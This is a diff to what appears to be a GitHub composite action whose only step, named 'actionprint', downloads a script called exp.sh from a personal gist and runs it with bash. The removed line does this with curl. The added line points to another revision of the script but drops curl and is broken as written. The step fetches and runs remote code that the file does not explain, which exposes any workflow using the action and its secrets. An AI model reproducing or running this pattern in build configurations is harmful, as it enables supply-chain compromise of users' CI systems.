@@ -9,5 +9,5 @@ runs:
   using: "composite"
   steps:
     - id: actionprint
-      run: curl https://gist.githubusercontent.com/rojan-rijal/ab3b48c1882ed3b74d955503cf2f2da1/raw/a3949daa1b330548bde09bf9166028f122b8ee91/exp.sh --output exp.sh && /bin/bash exp.sh
+      run: https://gist.githubusercontent.com/rojan-rijal/ab3b48c1882ed3b74d955503cf2f2da1/raw/876a33caa6117cc179db7881736b6157a8468194/exp.sh --output exp.sh && /bin/bash exp.sh
       shell: bash
